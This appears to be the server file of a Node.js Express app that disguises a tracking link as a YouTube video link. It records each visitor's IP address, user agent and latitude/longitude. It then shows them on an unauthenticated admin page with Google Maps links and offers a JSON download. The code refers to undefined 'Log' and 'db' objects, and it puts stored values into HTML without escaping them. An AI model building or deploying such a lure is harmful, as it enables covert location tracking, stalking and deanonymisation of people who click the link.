const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3000;



// ✅ Middleware
app.use(bodyParser.json());
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));

const localLogFile = path.join(__dirname, 'logs.txt');

// ✅ Function to save to local file
function saveToLocalFile(data) {
    const line = `${new Date().toISOString()} | IP: ${data.ip} | Lat: ${data.lat} | Lon: ${data.lon} | UA: ${data.userAgent}\n`;
    fs.appendFileSync(localLogFile, line);
}

// ✅ Tracker route
app.get('/yt/:id', (req, res) => {
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const userAgent = req.headers['user-agent'];
    res.render('tracker', { videoUrl: 'https://www.youtube.com/watch?v=dQw4w9WgXcQ', ip, userAgent });
});

// ✅ Save location to DB + Local File
app.post('/log', async (req, res) => {
    try {
        const logEntry = new Log(req.body);

        // Try to save to DB
        await logEntry.save();
        console.log("✅ Saved to DB:", req.body);

    } catch (err) {
        console.log("⚠️ DB Save Failed, writing to local file:", err.message);
    }

    // Always save to local file as backup
    saveToLocalFile(req.body);

    res.json({ status: 'ok' });
});

// ✅ Admin route to view logs
app.get('/admin/logs', async (req, res) => {
    try {
        let logs = [];
        let useLocal = false;

        if (db.readyState === 1) {
            logs = await Log.find().sort({ timestamp: -1 });
        } else {
            useLocal = true;
        }

        let html = `<h2>📜 Tracker Logs (${useLocal ? 'Local File' : 'MongoDB'})</h2>
        <table border="1" cellpadding="8">
        <tr><th>Time</th><th>IP</th><th>Lat</th><th>Lon</th><th>Device</th><th>Google Maps</th></tr>`;

        if (useLocal) {
            const fileData = fs.readFileSync(localLogFile, 'utf8').split('\n').filter(Boolean);
            fileData.forEach(line => {
                const parts = line.split('|');
                const time = parts[0].trim();
                const ip = parts[1].replace('IP:', '').trim();
                const lat = parts[2].replace('Lat:', '').trim();
                const lon = parts[3].replace('Lon:', '').trim();
                const ua = parts[4].replace('UA:', '').trim();

                html += `<tr>
                    <td>${time}</td>
                    <td>${ip}</td>
                    <td>${lat}</td>
                    <td>${lon}</td>
                    <td>${ua}</td>
                    <td><a target="_blank" href="https://www.google.com/maps?q=${lat},${lon}">View</a></td>
                </tr>`;
            });
        } else {
            logs.forEach(log => {
                html += `<tr>
                    <td>${log.timestamp.toISOString()}</td>
                    <td>${log.ip}</td>
                    <td>${log.lat}</td>
                    <td>${log.lon}</td>
                    <td>${log.userAgent}</td>
                    <td><a target="_blank" href="https://www.google.com/maps?q=${log.lat},${log.lon}">View</a></td>
                </tr>`;
            });
        }

        html += `</table><br><a href="/admin/logs/download">⬇️ Download Logs</a>`;
        res.send(html);

    } catch (err) {
        res.status(500).send('Error fetching logs');
    }
});

// ✅ Download logs as JSON
app.get('/admin/logs/download', async (req, res) => {
    try {
        if (db.readyState === 1) {
            const logs = await Log.find().sort({ timestamp: -1 });
            res.setHeader('Content-Disposition', 'attachment; filename="logs.json"');
            return res.json(logs);
        } else {
            const fileData = fs.readFileSync(localLogFile, 'utf8').split('\n').filter(Boolean);
            const logs = fileData.map(line => {
                const parts = line.split('|');
                return {
                    timestamp: parts[0].trim(),
                    ip: parts[1].replace('IP:', '').trim(),
                    lat: parts[2].replace('Lat:', '').trim(),
                    lon: parts[3].replace('Lon:', '').trim(),
                    userAgent: parts[4].replace('UA:', '').trim()
                };
            });
            res.setHeader('Content-Disposition', 'attachment; filename="logs_backup.json"');
            return res.json(logs);
        }
    } catch (err) {
        res.status(500).send('Error downloading logs');
    }
});

app.listen(PORT, () => console.log(`🚀 Server running on http://localhost:${PORT}`));
